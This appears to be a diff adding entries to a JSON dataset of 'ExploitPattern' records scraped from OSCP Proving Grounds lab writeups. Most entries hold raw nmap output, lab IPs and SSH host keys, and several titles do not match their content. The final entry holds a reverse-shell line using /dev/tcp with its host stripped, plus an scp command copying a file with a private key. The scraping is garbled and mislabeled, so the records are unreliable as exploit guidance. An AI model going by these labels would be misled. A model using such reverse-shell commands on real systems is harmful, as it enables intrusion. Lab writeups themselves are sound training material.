+      "143/tcp   open  imap           Mercury/32 imapd 4.62",
+      "443/tcp   open  ssl/http       Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)",
+      "2224/tcp  open  http           Mercury/32 httpd",
+      "7680/tcp  open  pando-pub?",
+      "8000/tcp  open  http           Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)",
+      "11100/tcp open  vnc            VNC (protocol 3.8)",
+      "20001/tcp open  ftp            FileZilla ftpd 0.9.41 beta",
+      "33006/tcp open  unknown"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-24",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Nmap 7.92 scan initiated Thu Feb  3 21:02:50 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /home/kali/Documents/AutoRecon/results/192.168.171.89/scans/_full_tcp_nmap.txt -oX /home/kali/Documents/AutoRecon/results/192.168.171.89/scans/xml/_full_tcp_nmap.xml 192.168.171.89",
+    "description": "Increasing send delay for 192.168.171.89 from 0 to 5 due to 11 out of 11 dropped probes since last increase. Increasing send delay for 192.168.171.89 from 5 to 10 due to 28 out of 69 dropped probes since last increase. Warning: 192.168.171.89 giving up on port because retransmission cap hit (6). Nmap scan report for 192.168.171.89 Host is up, received user-set (0.22s latency). Scanned at 2022-02-03 21:02:51 EST for 1165s Not shown: 65379 closed tcp ports (reset), 153 filtered tcp ports (no-response)",
+    "techniques": [
+      "Increasing send delay for 192.168.171.89 from 0 to 5 due to 11 out of 11 dropped probes since last increase.",
+      "Increasing send delay for 192.168.171.89 from 5 to 10 due to 28 out of 69 dropped probes since last increase.",
+      "Warning: 192.168.171.89 giving up on port because retransmission cap hit (6).",
+      "Nmap scan report for 192.168.171.89",
+      "Host is up, received user-set (0.22s latency).",
+      "Scanned at 2022-02-03 21:02:51 EST for 1165s",
+      "Not shown: 65379 closed tcp ports (reset), 153 filtered tcp ports (no-response)",
+      "PORT      STATE SERVICE REASON         VERSION",
+      "22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)",
+      "| ssh-hostkey:",
+      "|   3072 91:ba:0d:d4:39:05:e3:13:55:57:8f:1b:46:90:db:e4 (RSA)",
+      "|   256 0f:35:d1:a1:31:f2:f6:aa:75:e8:17:01:e7:1e:d1:d5 (ECDSA)",
+      "| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOX6nl2HC2/Prh0l8uVsnAzinDT2+rhj1VasPM8Df3ntzgb8XzQat7zC/nHm0v7yLWo/CjpI6pD+mrBh3P/wuqk=",
+      "|   256 af:f1:53:ea:7b:4d:d7:fa:d8:de:0d:f2:28:fc:86:d7 (ED25519)",
+      "|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBefJyPm1sjN+QedhTj6S1CPbXQZEFXb58RICJh970R8",
+      "80/tcp    open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))",
+      "|_http-server-header: Apache/2.4.41 (Ubuntu)",
+      "| http-robots.txt: 1 disallowed entry",
+      "|_/secret.txt",
+      "|_http-generator: WordPress 5.4.2"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-25",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Maria",
+    "description": "![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Maria/rooted202110172239.png)",
+    "techniques": [],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-26",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Nmap 7.92 scan initiated Tue Mar 22 11:26:10 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /home/kali/Documents/AutoRecon/results/192.168.194.127/scans/_full_tcp_nmap.txt -oX /home/kali/Documents/AutoRecon/results/192.168.194.127/scans/xml/_full_tcp_nmap.xml 192.168.194.127",
+    "description": "Increasing send delay for 192.168.194.127 from 0 to 5 due to 55 out of 137 dropped probes since last increase. Warning: 192.168.194.127 giving up on port because retransmission cap hit (6). Nmap scan report for 192.168.194.127 Host is up, received user-set (0.28s latency). Scanned at 2022-03-22 11:26:10 EDT for 2063s Not shown: 65439 closed tcp ports (reset), 78 filtered tcp ports (no-response) PORT      STATE SERVICE       REASON          VERSION 135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC",
+    "techniques": [
+      "Increasing send delay for 192.168.194.127 from 0 to 5 due to 55 out of 137 dropped probes since last increase.",
+      "Warning: 192.168.194.127 giving up on port because retransmission cap hit (6).",
+      "Nmap scan report for 192.168.194.127",
+      "Host is up, received user-set (0.28s latency).",
+      "Scanned at 2022-03-22 11:26:10 EDT for 2063s",
+      "Not shown: 65439 closed tcp ports (reset), 78 filtered tcp ports (no-response)",
+      "PORT      STATE SERVICE       REASON          VERSION",
+      "135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC",
+      "139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn",
+      "445/tcp   open  microsoft-ds? syn-ack ttl 127",
+      "3306/tcp  open  mysql?        syn-ack ttl 127",
+      "| mysql-info:",
+      "|_  MySQL Error: Host '192.168.49.194' is not allowed to connect to this MariaDB server",
+      "| fingerprint-strings:",
+      "|   NULL, NotesRPC, kumo-server:",
+      "|_    Host '192.168.49.194' is not allowed to connect to this MariaDB server",
+      "5040/tcp  open  unknown       syn-ack ttl 127",
+      "8000/tcp  open  http-alt      syn-ack ttl 127 BarracudaServer.com (Windows)",
+      "| http-methods:",
+      "|   Supported Methods: OPTIONS GET HEAD PROPFIND PUT COPY DELETE MOVE MKCOL PROPPATCH LOCK UNLOCK POST"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-27",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Nmap 7.91 scan initiated Mon Nov  1 13:05:24 2021 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /home/kali/Documents/AutoRecon/results/192.168.69.99/scans/_full_tcp_nmap.txt -oX /home/kali/Documents/AutoRecon/results/192.168.69.99/scans/xml/_full_tcp_nmap.xml 192.168.69.99",
+    "description": "nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN \"/home/kali/Documents/AutoRecon/results/192.168.69.99/scans/_full_tcp_nmap.txt\" -oX \"/home/kali/Documents/AutoRecon/results/192.168.69.99/scans/xml/_full_tcp_nmap.xml\" 192.168.69.99 Nmap scan report for 192.168.69.99 Host is up, received user-set (0.24s latency). Scanned at 2021-11-01 13:05:26 EDT for 365s Not shown: 65528 filtered ports PORT      STATE SERVICE       REASON          VERSION 21/tcp    open  ftp           syn-ack ttl 127 FileZilla ftpd",
+    "techniques": [
+      "nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN \"/home/kali/Documents/AutoRecon/results/192.168.69.99/scans/_full_tcp_nmap.txt\" -oX \"/home/kali/Documents/AutoRecon/results/192.168.69.99/scans/xml/_full_tcp_nmap.xml\" 192.168.69.99",
+      "Nmap scan report for 192.168.69.99",
+      "Host is up, received user-set (0.24s latency).",
+      "Scanned at 2021-11-01 13:05:26 EDT for 365s",
+      "Not shown: 65528 filtered ports",
+      "Reason: 65528 no-responses",
+      "PORT      STATE SERVICE       REASON          VERSION",
+      "21/tcp    open  ftp           syn-ack ttl 127 FileZilla ftpd",
+      "| ftp-syst:",
+      "|_  SYST: UNIX emulated by FileZilla",
+      "22/tcp    open  ssh           syn-ack ttl 127 OpenSSH for_Windows_8.1 (protocol 2.0)",
+      "| ssh-hostkey:",
+      "|   3072 86:84:fd:d5:43:27:05:cf:a7:f2:e9:e2:75:70:d5:f3 (RSA)",
+      "|   256 9c:93:cf:48:a9:4e:70:f4:60:de:e1:a9:c2:c0:b6:ff (ECDSA)",
+      "| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDJYE805huwKUl0fJM8+N9Mk7GUQeEEc5iA/yYqgxE7Bwgz4h5xufRONkR6bWxcxu8/AHslwkkDkjRKNdr4uFzY=",
+      "|   256 00:4e:d7:3b:0f:9f:e3:74:4d:04:99:0b:b1:8b:de:a5 (ED25519)",
+      "|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL8cLYuHBTVFfYPb/YzUIyT39bUzA/sPDFEC/xChZyZ4",
+      "135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC",
+      "139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn",
+      "3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-28",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Nukem",
+    "description": "![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Nukem/rooted202110231703.png)",
+    "techniques": [],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-29",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Nmap 7.91 scan initiated Sat Oct 30 11:18:34 2021 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /home/kali/Documents/AutoRecon/results/192.168.121.60/scans/_full_tcp_nmap.txt -oX /home/kali/Documents/AutoRecon/results/192.168.121.60/scans/xml/_full_tcp_nmap.xml 192.168.121.60",
+    "description": "![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Peppo/rooted202111010131.png) nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN \"/home/kali/Documents/AutoRecon/results/192.168.121.60/scans/_full_tcp_nmap.txt\" -oX \"/home/kali/Documents/AutoRecon/results/192.168.121.60/scans/xml/_full_tcp_nmap.xml\" 192.168.121.60 [/home/kali/Documents/AutoRecon/results/192.168.121.60/scans/_full_tcp_nmap.txt](file:///home/kali/Documents/AutoRecon/results/192.168.121.60/scans/_full_tcp_nmap.txt):",
+    "techniques": [
+      "nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN \"/home/kali/Documents/AutoRecon/results/192.168.121.60/scans/_full_tcp_nmap.txt\" -oX \"/home/kali/Documents/AutoRecon/results/192.168.121.60/scans/xml/_full_tcp_nmap.xml\" 192.168.121.60",
+      "adjust_timeouts2: packet supposedly had rtt of -81715 microseconds.  Ignoring time.",
+      "Nmap scan report for 192.168.121.60",
+      "Host is up, received user-set (0.21s latency).",
+      "Scanned at 2021-10-30 11:18:35 EDT for 360s",
+      "Not shown: 65529 filtered ports",
+      "Reason: 65529 no-responses",
+      "PORT      STATE  SERVICE           REASON         VERSION",
+      "22/tcp    open   ssh               syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)",
+      "|_auth-owners: root",
+      "| ssh-hostkey:",
+      "|   2048 75:4c:02:01:fa:1e:9f:cc:e4:7b:52:fe:ba:36:85:a9 (RSA)",
+      "|   256 b7:6f:9c:2b:bf:fb:04:62:f4:18:c9:38:f4:3d:6b:2b (ECDSA)",
+      "| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBqNWmLnEEMpbdgBBhkcQQqjHi1mO1wl55JIWh4kpqzQYuZaKGZ63cIOppztFxsAowPqOEhImpkEni9fcTflquQ=",
+      "|   256 98:7f:b6:40:ce:bb:b5:57:d5:d1:3c:65:72:74:87:c3 (ED25519)",
+      "|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOEgaTq2swxYKGv8XDDrdarrUGFDnxl/3X18UjliCfL6",
+      "53/tcp    closed domain            reset ttl 63",
+      "113/tcp   open   ident             syn-ack ttl 63 FreeBSD identd",
+      "|_auth-owners: nobody",
+      "5432/tcp  open   postgresql        syn-ack ttl 62 PostgreSQL DB 9.6.0 or later"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-30",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Nmap 7.91 scan initiated Fri Jul 16 12:02:54 2021 as: nmap -Pn -p- -sC -sV -T4 -oN Postfish.nmap 192.168.235.137",
+    "description": "Nmap scan report for 192.168.235.137 PORT      STATE    SERVICE  VERSION 22/tcp    open     ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) |   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA) |   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA) |_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519) 25/tcp    open     smtp     Postfix smtpd |_smtp-commands: postfish.off, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING,",
+    "techniques": [
+      "Nmap scan report for 192.168.235.137",
+      "Host is up (0.25s latency).",
+      "Not shown: 65525 closed ports",
+      "PORT      STATE    SERVICE  VERSION",
+      "22/tcp    open     ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)",
+      "| ssh-hostkey:",
+      "|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)",
+      "|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)",
+      "|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)",
+      "25/tcp    open     smtp     Postfix smtpd",
+      "|_smtp-commands: postfish.off, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING,",
+      "| ssl-cert: Subject: commonName=ubuntu",
+      "| Subject Alternative Name: DNS:ubuntu",
+      "| Not valid before: 2021-01-26T10:26:37",
+      "|_Not valid after:  2031-01-24T10:26:37",
+      "|_ssl-date: TLS randomness does not represent time",
+      "80/tcp    open     http     Apache httpd 2.4.41 ((Ubuntu))",
+      "|_http-server-header: Apache/2.4.41 (Ubuntu)",
+      "|_http-title: Site doesn't have a title (text/html).",
+      "110/tcp   open     pop3     Dovecot pop3d"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-31",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Nmap 7.91 scan initiated Thu Jul  1 08:10:12 2021 as: nmap -Pn -p- -sC -sV -T4 -oN Quackerjack.nmap 192.168.102.57",
+    "description": "nmap -Pn -p- -sC -sV -T4 -oN Quackerjack.nmap 192.168.102.57 Nmap scan report for 192.168.102.57 Not shown: 65527 filtered ports PORT     STATE SERVICE     VERSION 21/tcp   open  ftp         vsftpd 3.0.2 | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_Can't get directory listing: TIMEOUT |      Connected to ::ffff:192.168.49.102 |      No session bandwidth limit |      Session timeout in seconds is 300 |      Control connection is plain text |      Data connections will be plain text |      At session startup, client count was 2",
+    "techniques": [
+      "nmap -Pn -p- -sC -sV -T4 -oN Quackerjack.nmap 192.168.102.57",
+      "Nmap scan report for 192.168.102.57",
+      "Host is up (0.22s latency).",
+      "Not shown: 65527 filtered ports",
+      "PORT     STATE SERVICE     VERSION",
+      "21/tcp   open  ftp         vsftpd 3.0.2",
+      "| ftp-anon: Anonymous FTP login allowed (FTP code 230)",
+      "|_Can't get directory listing: TIMEOUT",
+      "| ftp-syst:",
+      "|   STAT:",
+      "| FTP server status:",
+      "|      Connected to ::ffff:192.168.49.102",
+      "|      Logged in as ftp",
+      "|      TYPE: ASCII",
+      "|      No session bandwidth limit",
+      "|      Session timeout in seconds is 300",
+      "|      Control connection is plain text",
+      "|      Data connections will be plain text",
+      "|      At session startup, client count was 2",
+      "|      vsFTPd 3.0.2 - secure, fast, stable"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-32",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "pc = payload claim to tamper with",
+    "description": "Trying to mount the share folder through NFS service. sudo mount -t nfs 192.168.183.222:/mnt/share /tmp/test_folder -o nolock ![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Scarlet/Scarlet_20221015_12h21m37s_001_.png) Finding a public key but don't know where to use it. ![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Scarlet/Scarlet_20221015_12h23m17s_002_.png) Next, we turn to enumerate website. Adding DNS setting.",
+    "techniques": [
+      "PORT      STATE SERVICE",
+      "22/tcp    open  ssh",
+      "80/tcp    open  http",
+      "111/tcp   open  rpcbind",
+      "2049/tcp  open  nfs",
+      "37977/tcp open  unknown",
+      "40423/tcp open  unknown",
+      "41035/tcp open  unknown",
+      "42825/tcp open  unknown",
+      "57877/tcp open  unknown",
+      "111/udp   open  rpcbind",
+      "33779/udp open  unknown",
+      "50918/udp open  unknown",
+      "57140/udp open  unknown",
+      "57739/udp open  unknown",
+      "58802/udp open  unknown",
+      "![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Scarlet/Scarlet_20221015_12h21m37s_001_.png)",
+      "Finding a public key but don't know where to use it.",
+      "Next, we turn to enumerate website. Adding DNS setting.",
+      "Clicking `Author's Portal` to link to the login page. After trying to register many accounts, I find an existing account `brain` the web admin shows on the contacts page."
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-33",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Nmap 7.91 scan initiated Sat Jan  1 23:01:45 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /home/kali/Documents/OffSecPG/Shiftdel/AutoRecon/results/192.168.188.174/scans/_full_tcp_nmap.txt -oX /home/kali/Documents/OffSecPG/Shiftdel/AutoRecon/results/192.168.188.174/scans/xml/_full_tcp_nmap.xml 192.168.188.174",
+    "description": "Increasing send delay for 192.168.188.174 from 0 to 5 due to 1073 out of 2682 dropped probes since last increase. Nmap scan report for 192.168.188.174 Host is up, received user-set (0.20s latency). Scanned at 2022-01-01 23:01:46 EST for 926s PORT     STATE SERVICE REASON         VERSION 22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) |   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGGcX/x/M6J7Y0V8EeUt0FqceuxieEOe2fUH2RsY3XiSxByQWNQi+XSrFElrfjdR2sgnauIWWhWibfD+kTmSP5gkFcaoSsLtgfMP/2G8yuxPSev+9o1N18gZchJneakItNTaz1ltG1W//qJPZDHmkDneyv798f9ZdXBzidtR5/+2ArZd64bldUxx0irH0lNcf+ICuVlhOZyXGvSx/ceMCRozZrW2JQU+WLvs49gC78zZgvN+wrAZ/3s8gKPOIPobN3ObVSkZ+zngt0Xg/Zl11LLAbyWX7TupAt6lTYOvCSwNVZURyB1dDdjlMAXqT/Ncr4Lb",
+    "techniques": [
+      "Increasing send delay for 192.168.188.174 from 0 to 5 due to 1073 out of 2682 dropped probes since last increase.",
+      "Nmap scan report for 192.168.188.174",
+      "Host is up, received user-set (0.20s latency).",
+      "Scanned at 2022-01-01 23:01:46 EST for 926s",
+      "Not shown: 65532 closed ports",
+      "Reason: 65532 resets",
+      "PORT     STATE SERVICE REASON         VERSION",
+      "22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)",
+      "| ssh-hostkey:",
+      "|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)",
+      "|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)",
+      "| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCpAb2jUKovAahxmPX9l95Pq9YWgXfIgDJw0obIpOjOkdP3b0ukm/mrTNgX2lg1mQBMlS3lzmQmxeyHGg9+xuJA=",
+      "|   256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)",
+      "|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0omUJRIaMtPNYa4CKBC+XUzVyZsJ1QwsksjpA/6Ml+",
+      "80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.38 ((Debian))",
+      "|_http-generator: WordPress 4.9.6",
+      "| http-methods:",
+      "|_  Supported Methods: GET HEAD POST OPTIONS",
+      "|_http-server-header: Apache/2.4.38 (Debian)",
+      "|_http-title: Shiftdel"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-34",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Nmap 7.91 scan initiated Thu Dec 16 11:54:44 2021 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /home/kali/Documents/OffSecPG/Shifty/AutoRecon/results/192.168.55.59/scans/_full_tcp_nmap.txt -oX /home/kali/Documents/OffSecPG/Shifty/AutoRecon/results/192.168.55.59/scans/xml/_full_tcp_nmap.xml 192.168.55.59",
+    "description": "adjust_timeouts2: packet supposedly had rtt of -1208241 microseconds.  Ignoring time. adjust_timeouts2: packet supposedly had rtt of -1208241 microseconds.  Ignoring time. Nmap scan report for 192.168.55.59 Host is up, received user-set (0.20s latency). Scanned at 2021-12-16 11:54:45 EST for 371s Not shown: 65530 filtered ports PORT      STATE  SERVICE   REASON         VERSION 22/tcp    open   ssh       syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0) |   2048 54:d8:d1:1a:e4:8c:66:48:37:ba:89:0a:9b:aa:db:47 (RSA)",
+    "techniques": [
+      "adjust_timeouts2: packet supposedly had rtt of -1208241 microseconds.  Ignoring time.",
+      "Nmap scan report for 192.168.55.59",
+      "Host is up, received user-set (0.20s latency).",
+      "Scanned at 2021-12-16 11:54:45 EST for 371s",
+      "Not shown: 65530 filtered ports",
+      "Reason: 65530 no-responses",
+      "PORT      STATE  SERVICE   REASON         VERSION",
+      "22/tcp    open   ssh       syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)",
+      "| ssh-hostkey:",
+      "|   2048 54:d8:d1:1a:e4:8c:66:48:37:ba:89:0a:9b:aa:db:47 (RSA)",
+      "|   256 fb:75:84:86:ec:b5:00:f3:4f:cb:c8:f2:18:85:42:b7 (ECDSA)",
+      "| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMTUc/WfFpP13Cs+MfoVp8EAwjODshXOpOBYCLG/SrFn5k1xSZVmqM3BVE/Dm2/AMOQGSmYzhMwUOj3rYuwnhWE=",
+      "|   256 2f:fd:b2:b1:6c:02:e8:a0:ba:e7:f7:52:80:3f:de:a3 (ED25519)",
+      "|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAoY388QpNieLBhyB714K9LnjTUPfbgw4bfpGgdMBT0c",
+      "53/tcp    closed domain    reset ttl 63",
+      "80/tcp    open   http      syn-ack ttl 63 nginx 1.10.3",
+      "|_http-generator: Gatsby 2.22.15",
+      "| http-methods:",
+      "|_  Supported Methods: GET HEAD",
+      "|_http-server-header: nginx/1.10.3"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-35",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Nmap 7.91 scan initiated Sat Nov  6 21:24:55 2021 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /home/kali/Documents/AutoRecon/results/192.168.124.53/scans/_full_tcp_nmap.txt -oX /home/kali/Documents/AutoRecon/results/192.168.124.53/scans/xml/_full_tcp_nmap.xml 192.168.124.53",
+    "description": "adjust_timeouts2: packet supposedly had rtt of -309102 microseconds.  Ignoring time. adjust_timeouts2: packet supposedly had rtt of -309102 microseconds.  Ignoring time. adjust_timeouts2: packet supposedly had rtt of -596290 microseconds.  Ignoring time. adjust_timeouts2: packet supposedly had rtt of -596290 microseconds.  Ignoring time. adjust_timeouts2: packet supposedly had rtt of -588438 microseconds.  Ignoring time. adjust_timeouts2: packet supposedly had rtt of -588438 microseconds.  Ignoring time.",
+    "techniques": [
+      "adjust_timeouts2: packet supposedly had rtt of -309102 microseconds.  Ignoring time.",
+      "adjust_timeouts2: packet supposedly had rtt of -596290 microseconds.  Ignoring time.",
+      "adjust_timeouts2: packet supposedly had rtt of -588438 microseconds.  Ignoring time.",
+      "adjust_timeouts2: packet supposedly had rtt of -2020515 microseconds.  Ignoring time.",
+      "Nmap scan report for 192.168.124.53",
+      "Host is up, received user-set (0.26s latency).",
+      "Scanned at 2021-11-06 21:24:56 EDT for 1058s",
+      "Not shown: 65520 filtered ports",
+      "Reason: 65520 no-responses",
+      "PORT      STATE SERVICE       REASON          VERSION",
+      "21/tcp    open  ftp           syn-ack ttl 127 FileZilla ftpd 0.9.41 beta",
+      "| ftp-syst:",
+      "|_  SYST: UNIX emulated by FileZilla",
+      "135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC",
+      "139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn",
+      "445/tcp   open  microsoft-ds? syn-ack ttl 127",
+      "3306/tcp  open  mysql?        syn-ack ttl 127",
+      "| fingerprint-strings:",
+      "|   NULL, ibm-db2, ibm-db2-das, oracle-tns:",
+      "|_    Host '192.168.49.124' is not allowed to connect to this MariaDB server"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-36",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Snookums",
+    "description": "![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Snookums/walkthrough.png) nmap -Pn -p- -sC -sV 192.168.91.58 -T4 -oN Snookums Nmap scan report for 192.168.91.58 Not shown: 65490 filtered ports, 37 closed ports PORT      STATE SERVICE     VERSION 21/tcp    open  ftp         vsftpd 3.0.2 | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_Can't get directory listing: TIMEOUT |      Connected to ::ffff:192.168.49.91 |      No session bandwidth limit |      Session timeout in seconds is 300",
+    "techniques": [
+      "nmap -Pn -p- -sC -sV 192.168.91.58 -T4 -oN Snookums",
+      "Nmap scan report for 192.168.91.58",
+      "Host is up (0.20s latency).",
+      "Not shown: 65490 filtered ports, 37 closed ports",
+      "PORT      STATE SERVICE     VERSION",
+      "21/tcp    open  ftp         vsftpd 3.0.2",
+      "| ftp-anon: Anonymous FTP login allowed (FTP code 230)",
+      "|_Can't get directory listing: TIMEOUT",
+      "| ftp-syst:",
+      "|   STAT:",
+      "| FTP server status:",
+      "|      Connected to ::ffff:192.168.49.91",
+      "|      Logged in as ftp",
+      "|      TYPE: ASCII",
+      "|      No session bandwidth limit",
+      "|      Session timeout in seconds is 300",
+      "|      Control connection is plain text",
+      "|      Data connections will be plain text",
+      "|      At session startup, client count was 2",
+      "|      vsFTPd 3.0.2 - secure, fast, stable"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-37",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Socerer",
+    "description": "nmap -Pn -p- -sC -sV 192.168.206.100 -T4 -oN Sorcerer.nmap ![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Sorcerer/Sorcerer_2021.06.26_20h04m29s_001_.png) The website on 80 port only displays text messages, checking the code to confirm that it is only plain text. ![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Sorcerer/Sorcerer_2021.06.26_20h36m59s_009_.png) No special directory was found during the scan. ![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Sorcerer/Sorcerer_2021.06.26_20h21m34s_002_.png)",
+    "techniques": [
+      "nmap -Pn -p- -sC -sV 192.168.206.100 -T4 -oN Sorcerer.nmap",
+      "/bin/bash -l > /dev/tcp// 0&1",
+      "scp -i ~/Downloads/id_rsa ~/Documents/OffSecPG/Sorcerer/scp_wrapper.sh max@:/home/max",
